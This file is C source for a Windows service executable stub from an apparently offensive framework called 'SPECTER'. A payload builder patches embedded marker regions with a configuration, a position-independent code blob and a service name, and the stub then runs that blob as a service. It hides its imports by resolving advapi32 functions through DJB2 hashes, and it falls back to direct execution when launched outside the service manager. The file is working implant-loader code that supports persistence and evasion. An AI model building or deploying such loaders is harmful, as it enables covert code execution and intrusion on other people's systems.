/**
 * SPECTER Stubs -- Windows Service EXE Stub
 *
 * Minimal Windows service executable that registers as a service,
 * then executes an embedded PIC blob.  CRT-free, no static imports.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -ffreestanding
 *        -e ServiceEntry -o service_stub.exe service_stub.c
 *
 * The payload builder patches three regions:
 *   1. Config marker  (CCCCCCCCCCCCCCCC + max_size + zero-pad)
 *   2. PIC blob marker (SPECPICBLOB\0 + size + blob data)
 *   3. Service name   (SPECSVCNAME\0 + 64 bytes)
 */

#include "stub_common.h"

/* ------------------------------------------------------------------ */
/*  Windows service types (manual definitions)                         */
/* ------------------------------------------------------------------ */

#define SERVICE_WIN32_OWN_PROCESS  0x00000010

#define SERVICE_START_PENDING      0x00000002
#define SERVICE_RUNNING            0x00000004
#define SERVICE_STOP_PENDING       0x00000003
#define SERVICE_STOPPED            0x00000001

#define SERVICE_ACCEPT_STOP        0x00000001
#define SERVICE_ACCEPT_SHUTDOWN    0x00000004

#define SERVICE_CONTROL_STOP       0x00000001
#define SERVICE_CONTROL_SHUTDOWN   0x00000005
#define SERVICE_CONTROL_INTERROGATE 0x00000004

#define ERROR_CALL_NOT_IMPLEMENTED 0x00000078
#define NO_ERROR                   0x00000000

typedef struct _SERVICE_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
} SERVICE_STATUS;

typedef HANDLE SERVICE_STATUS_HANDLE;

/* Function pointer types for advapi32 APIs */
typedef void (__attribute__((ms_abi)) *fn_ServiceMain)(DWORD argc, PWCHAR *argv);

typedef DWORD (__attribute__((ms_abi)) *fn_HandlerEx)(
    DWORD dwControl, DWORD dwEventType, PVOID lpEventData, PVOID lpContext);

typedef SERVICE_STATUS_HANDLE (__attribute__((ms_abi)) *fn_RegisterServiceCtrlHandlerExW)(
    const WCHAR *lpServiceName,
    fn_HandlerEx lpHandlerProc,
    PVOID lpContext);

typedef BOOL (__attribute__((ms_abi)) *fn_SetServiceStatus)(
    SERVICE_STATUS_HANDLE hServiceStatus,
    SERVICE_STATUS *lpServiceStatus);

typedef BOOL (__attribute__((ms_abi)) *fn_StartServiceCtrlDispatcherW)(
    PVOID lpServiceStartTable);

/* SERVICE_TABLE_ENTRY layout: [WCHAR* name, fn_ServiceMain proc] */
typedef struct _SERVICE_TABLE_ENTRYW {
    PWCHAR         lpServiceName;
    fn_ServiceMain lpServiceProc;
} SERVICE_TABLE_ENTRYW;

/* DJB2 hashes for advapi32 functions.
 * Module hash from sleep.h (verified in test_sleep.c).
 * Function hashes: regenerate with compute_hashes.py if names change. */
#define HASH_ADVAPI32_DLL                      0x67208A49  /* "advapi32.dll" (from sleep.h) */
#define HASH_REGISTERSERVICECTRLHANDLEREXW      0xE210E582  /* "RegisterServiceCtrlHandlerExW" */
#define HASH_SETSERVICESTATUS                   0x4DB5D2A6  /* "SetServiceStatus" */
#define HASH_STARTSERVICECTRLDISPATCHERW        0x62217317  /* "StartServiceCtrlDispatcherW" */

/* ------------------------------------------------------------------ */
/*  Embedded data section                                              */
/* ------------------------------------------------------------------ */

#pragma section(".data", read, write)

/* Config region */
__attribute__((section(".data"), used))
static volatile BYTE stub_config_region[CONFIG_MARKER_LEN + sizeof(DWORD) + CONFIG_MAX_CAPACITY] = {
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x00, 0x10, 0x00, 0x00, /* max_size = 4096 */
};

/* PIC blob region */
__attribute__((section(".data"), used))
static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
    'S','P','E','C','P','I','C','B','L','O','B','\0',
    0x00, 0x00, 0x00, 0x00,
};

/**
 * Service name marker region:
 *   [12 bytes: "SPECSVCNAME\0"]
 *   [64 bytes: service name (wide or narrow, patched by builder)]
 *
 * Default: "SpecterSvc" (narrow string, builder may overwrite)
 */
#define SVC_NAME_MARKER_LEN 12
#define SVC_NAME_MAX_LEN    64

__attribute__((section(".data"), used))
static volatile BYTE stub_svc_name_region[SVC_NAME_MARKER_LEN + SVC_NAME_MAX_LEN] = {
    'S','P','E','C','S','V','C','N','A','M','E','\0',
    /* Default service name (narrow) */
    'S','p','e','c','t','e','r','S','v','c','\0',
};

/* ------------------------------------------------------------------ */
/*  Global service state                                               */
/* ------------------------------------------------------------------ */

static SERVICE_STATUS_HANDLE g_svc_status_handle;
static SERVICE_STATUS        g_svc_status;
static volatile BOOL         g_svc_stop_requested;

/* Cached function pointers */
static fn_SetServiceStatus   g_pSetServiceStatus;

/* ------------------------------------------------------------------ */
/*  Service control handler                                            */
/* ------------------------------------------------------------------ */

static DWORD __attribute__((ms_abi)) SvcCtrlHandlerEx(
    DWORD dwControl, DWORD dwEventType, PVOID lpEventData, PVOID lpContext
) {
    (void)dwEventType;
    (void)lpEventData;
    (void)lpContext;

    switch (dwControl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_svc_stop_requested = TRUE;
        g_svc_status.dwCurrentState = SERVICE_STOP_PENDING;
        g_svc_status.dwCheckPoint   = 1;
        g_svc_status.dwWaitHint     = 5000;
        if (g_pSetServiceStatus)
            g_pSetServiceStatus(g_svc_status_handle, &g_svc_status);
        return NO_ERROR;

    case SERVICE_CONTROL_INTERROGATE:
        return NO_ERROR;

    default:
        return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

/* ------------------------------------------------------------------ */
/*  ServiceMain                                                        */
/* ------------------------------------------------------------------ */

static void __attribute__((ms_abi)) SvcMain(DWORD argc, PWCHAR *argv) {
    (void)argc;
    (void)argv;

    /* Resolve advapi32 functions */
    PVOID advapi32 = stub_find_module(HASH_ADVAPI32_DLL);
    if (!advapi32)
        return;

    fn_RegisterServiceCtrlHandlerExW pRegister =
        (fn_RegisterServiceCtrlHandlerExW)stub_find_export(advapi32, HASH_REGISTERSERVICECTRLHANDLEREXW);
    g_pSetServiceStatus =
        (fn_SetServiceStatus)stub_find_export(advapi32, HASH_SETSERVICESTATUS);

    if (!pRegister || !g_pSetServiceStatus)
        return;

    /* Build wide service name from the embedded narrow string */
    const char *svc_narrow = (const char *)(stub_svc_name_region + SVC_NAME_MARKER_LEN);
    WCHAR svc_wide[SVC_NAME_MAX_LEN];
    int i;
    for (i = 0; i < SVC_NAME_MAX_LEN - 1 && svc_narrow[i]; i++)
        svc_wide[i] = (WCHAR)svc_narrow[i];
    svc_wide[i] = L'\0';

    /* Register handler */
    g_svc_status_handle = pRegister(svc_wide, SvcCtrlHandlerEx, NULL);
    if (!g_svc_status_handle)
        return;

    /* Report SERVICE_START_PENDING */
    stub_memset(&g_svc_status, 0, sizeof(g_svc_status));
    g_svc_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwCurrentState     = SERVICE_START_PENDING;
    g_svc_status.dwControlsAccepted = 0;
    g_svc_status.dwCheckPoint       = 1;
    g_svc_status.dwWaitHint         = 10000;
    g_pSetServiceStatus(g_svc_status_handle, &g_svc_status);

    /* Report SERVICE_RUNNING */
    g_svc_status.dwCurrentState     = SERVICE_RUNNING;
    g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_svc_status.dwCheckPoint       = 0;
    g_svc_status.dwWaitHint         = 0;
    g_pSetServiceStatus(g_svc_status_handle, &g_svc_status);

    /* Execute payload */
    g_svc_stop_requested = FALSE;
    stub_execute_payload();

    /* Report SERVICE_STOPPED */
    g_svc_status.dwCurrentState     = SERVICE_STOPPED;
    g_svc_status.dwControlsAccepted = 0;
    g_svc_status.dwCheckPoint       = 0;
    g_svc_status.dwWaitHint         = 0;
    g_svc_status.dwWin32ExitCode    = NO_ERROR;
    g_pSetServiceStatus(g_svc_status_handle, &g_svc_status);
}

/* ------------------------------------------------------------------ */
/*  EXE entry point (CRT-free)                                         */
/*                                                                     */
/*  Calls StartServiceCtrlDispatcherW to register ServiceMain.         */
/*  If running outside SCM (e.g. debugger), falls back to direct       */
/*  payload execution.                                                 */
/* ------------------------------------------------------------------ */

__attribute__((ms_abi))
void ServiceEntry(void) {
    /* Resolve advapi32!StartServiceCtrlDispatcherW */
    PVOID advapi32 = stub_find_module(HASH_ADVAPI32_DLL);
    if (!advapi32) {
        /* No advapi32 loaded -- direct execution fallback */
        stub_execute_payload();
        return;
    }

    fn_StartServiceCtrlDispatcherW pDispatcher =
        (fn_StartServiceCtrlDispatcherW)stub_find_export(advapi32, HASH_STARTSERVICECTRLDISPATCHERW);
    if (!pDispatcher) {
        stub_execute_payload();
        return;
    }

    /* Build wide service name */
    const char *svc_narrow = (const char *)(stub_svc_name_region + SVC_NAME_MARKER_LEN);
    WCHAR svc_wide[SVC_NAME_MAX_LEN];
    int i;
    for (i = 0; i < SVC_NAME_MAX_LEN - 1 && svc_narrow[i]; i++)
        svc_wide[i] = (WCHAR)svc_narrow[i];
    svc_wide[i] = L'\0';

    /* Build service table */
    SERVICE_TABLE_ENTRYW dispatch_table[2];
    dispatch_table[0].lpServiceName = svc_wide;
    dispatch_table[0].lpServiceProc = SvcMain;
    dispatch_table[1].lpServiceName = NULL;
    dispatch_table[1].lpServiceProc = NULL;

    /* Start the service dispatcher.  This call blocks until the
       service is stopped. If it fails (not launched by SCM), fall
       back to direct execution. */
    if (!pDispatcher((PVOID)dispatch_table)) {
        stub_execute_payload();
    }
}
